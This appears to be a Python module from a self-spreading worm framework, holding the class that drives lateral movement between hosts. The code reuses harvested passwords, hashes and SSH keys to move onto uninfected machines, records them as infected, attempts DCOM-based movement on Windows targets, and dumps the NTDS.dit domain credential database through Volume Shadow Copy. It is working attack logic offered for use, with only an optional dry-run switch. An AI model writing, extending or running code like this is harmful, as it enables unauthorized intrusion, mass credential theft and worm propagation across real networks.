from typing import Dict

from .module_imports import logger
from .standalone import get_local_ip


class WormCoreLateral:
    def _try_lateral_movement(self, source_ip: str, source_target: Dict):
        if not self.lateral_movement or not self.knowledge_graph:
            return

        creds_list = self.knowledge_graph.get_credentials_for_host(source_ip)
        if not creds_list and self.cred_manager:
            discovered = self.cred_manager.get_discovered_credentials()
            if discovered:
                creds_list = [
                    {"username": u, "password": p, "type": "password"} for u, p in discovered
                ]

        if not creds_list:
            return

        uninfected = self.knowledge_graph.get_uninfected_hosts()
        if not uninfected:
            return

        for cred_info in creds_list[:3]:
            credentials = {
                "username": cred_info.get("username", ""),
                "password": cred_info.get("password", ""),
                "hash": cred_info.get("hash", ""),
                "ssh_key": cred_info.get("ssh_key", ""),
            }

            for target_ip in uninfected[:5]:
                target_info = None
                for host in self.scan_results:
                    if host["ip"] == target_ip:
                        target_info = host
                        break

                if not target_info:
                    continue

                source_host = {
                    "ip": source_ip,
                    "os_guess": source_target.get("os_guess", "Unknown"),
                }

                logger.info(
                    f"Lateral movement: {source_ip} -> {target_ip} as {credentials.get('username', '?')}"
                )
                self.stats["lateral_movements"] += 1

                if self.dry_run:
                    logger.info(f"[DRY RUN] Would attempt lateral movement to {target_ip}")
                    continue

                success, result = self.lateral_movement.move(
                    source_host, target_info, credentials=credentials
                )

                if success:
                    self.stats["lateral_success"] += 1
                    logger.success(f"Lateral movement succeeded: {source_ip} -> {target_ip}")

                    if target_ip not in self.infected_hosts:
                        self.infected_hosts.add(target_ip)
                        self.stats["infections"] += 1

                        if self.knowledge_graph:
                            self.knowledge_graph.mark_infected(
                                target_ip, result.get("technique", "lateral")
                            )

                        if self.host_monitor:
                            self.host_monitor.register_host(
                                target_ip,
                                os_guess=target_info.get("os_guess", "Unknown"),
                                ports=target_info.get("open_ports", []),
                                exploit_method=f"lateral_{result.get('technique', 'unknown')}",
                            )
                            self.host_monitor.record_lateral_movement(
                                source_ip,
                                target_ip,
                                result.get("technique", "unknown"),
                                True,
                            )

                        self.real_world_agent.provide_feedback(target_info, True, 30)

                    if self.host_monitor:
                        self.host_monitor.record_lateral_movement(
                            source_ip,
                            target_ip,
                            result.get("technique", "unknown"),
                            True,
                        )

                    return

        if self.dcom_lateral:
            try:
                os_guess = source_target.get("os_guess", "").lower()
                if "windows" in os_guess:
                    for target_ip in uninfected[:3]:
                        dcom_ok, dcom_result = self.dcom_lateral.move(
                            target_ip=target_ip,
                            command="whoami",
                            username=credentials.get("username"),
                            password=credentials.get("password"),
                            technique="auto",
                        )
                        if dcom_ok:
                            logger.success(f"DCOM lateral: {source_ip} -> {target_ip}")
                            if target_ip not in self.infected_hosts:
                                self.infected_hosts.add(target_ip)
                                self.stats["infections"] += 1
                            break
            except Exception as e:
                logger.debug(f"DCOM lateral movement failed: {e}")

        if self.vss_ntds:
            try:
                os_guess = source_target.get("os_guess", "").lower()
                if "windows" in os_guess:
                    logger.info(f"Extracting NTDS.dit via VSS on {source_ip}")
                    ntds_result = self.vss_ntds.run(volume="C:", cleanup=True)
                    if ntds_result.get("ntds_dumped"):
                        logger.success(f"NTDS.dit extracted from {source_ip}")
                        self.stats["credentials_discovered"] += len(ntds_result.get("hashes", []))
            except Exception as e:
                logger.debug(f"VSS NTDS extraction failed: {e}")
